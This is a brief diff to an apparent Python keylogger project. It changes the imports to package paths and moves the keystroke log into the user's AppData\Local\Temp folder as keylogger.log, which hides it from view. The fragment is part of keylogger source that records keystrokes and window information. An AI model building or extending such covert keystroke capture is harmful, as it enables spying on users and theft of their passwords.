@@ -1,13 +1,13 @@
-import keyboard
-from handler import Handler
-from converter import Converter
-from windowchecker import WindowChecker
+import keyboard, os
+from keylogger.handler import Handler
+from keylogger.converter import Converter
+from keylogger.windowchecker import WindowChecker
 from datetime import datetime
 
 
 class Keylogger:
     def __init__(self) -> None:
-        self.logfile = 'log.txt'
+        self.logfile = f'{os.path.expanduser('~')}\\AppData\\Local\\Temp\\keylogger.log'
         self.text = ""
         self.key_count = 0
         self.handler = Handler()
